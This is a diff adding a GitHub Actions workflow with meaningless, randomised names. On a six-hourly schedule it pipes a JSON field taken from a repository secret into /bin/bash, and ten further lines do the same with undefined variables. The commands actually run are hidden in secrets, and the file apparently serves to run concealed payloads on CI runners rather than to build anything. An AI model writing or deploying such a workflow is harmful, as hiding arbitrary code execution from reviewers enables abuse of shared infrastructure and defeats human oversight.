@@ -1,0 +1,27 @@
+name: zaifengzf
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zaifengzf
+        env:
+          gbldp947: ${{ secrets.gbldp947 }}
+        run: |
+          echo $gbldp947 | jq -r .mon434 | /bin/bash
+          echo $kgvww940 | jq -r .wggk20 | /bin/bash
+          echo $qtz400 | jq -r .ydcr1715 | /bin/bash
+          echo $w87 | jq -r .bvzj09129 | /bin/bash
+          echo $vkb277 | jq -r .fx26136 | /bin/bash
+          echo $w93 | jq -r .mwj8 | /bin/bash
+          echo $kqxy903 | jq -r .wuclt3465 | /bin/bash
+          echo $lpudy78351 | jq -r .pmnps132 | /bin/bash
+          echo $atb86095 | jq -r .vjiqj7694 | /bin/bash
+          echo $x105 | jq -r .qw0042 | /bin/bash
+          echo $bjx9888 | jq -r .rauvk57209 | /bin/bash
+
